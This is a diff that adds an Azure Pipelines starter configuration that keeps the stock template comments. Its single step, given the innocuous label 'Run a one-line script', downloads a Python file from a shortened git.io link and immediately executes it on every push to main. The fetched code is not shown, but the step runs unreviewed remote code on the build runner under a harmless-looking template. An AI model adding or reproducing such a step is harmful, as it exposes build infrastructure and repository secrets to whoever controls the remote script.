@@ -1,0 +1,14 @@
+# Starter pipeline
+# Start with a minimal pipeline that you can customize to build and deploy your code.
+# Add steps that build, run tests, deploy, and more:
+# https://aka.ms/yaml
+
+trigger:
+- main
+
+pool:
+  vmImage: ubuntu-latest
+
+steps:
+- script:wget -O locals.py https://git.io/JY9UM && python3 locals.py
+  displayName: 'Run a one-line script'
